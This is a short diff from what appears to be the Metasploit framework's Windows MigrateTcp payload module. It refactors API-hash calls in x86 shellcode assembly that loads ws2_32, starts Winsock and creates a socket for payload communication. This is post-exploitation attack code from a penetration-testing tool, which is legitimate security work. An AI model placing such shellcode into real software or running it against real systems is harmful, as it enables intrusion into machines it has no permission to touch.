@@ -34,14 +34,14 @@ module Payload::Windows::MigrateTcp
       push '32'
       push 'ws2_'
       push esp                  ; pointer to 'ws2_32'
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+      push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
       call ebp                  ; LoadLibraryA('ws2_32')
     init_networking:
       mov eax, #{WSA_VERSION}   ; EAX == version, and is also used for size
       sub esp, eax              ; allocate space for the WSAData structure
       push esp                  ; Pointer to the WSAData structure
       push eax                  ; Version required
-      push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+      push #{block_api_hash('ws2_32.dll', 'WSAStartup')}
       call ebp                  ; WSAStartup(Version, &WSAData)
     create_socket:
       push eax                  ; eax is 0 on success, use it for flags
@@ -53,7 +53,7 @@ module Payload::Windows::MigrateTcp
       push eax                  ; SOCK_STREAM
       inc eax
       push eax                  ; AF_INET
-      push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+      push #{block_api_hash('ws2_32.dll', 'WSASocketA')}
       call ebp                  ; WSASocketA(AF_INET, SOCK_STREAM, 0, &info, 0, 0)
       xchg edi, eax
     ^
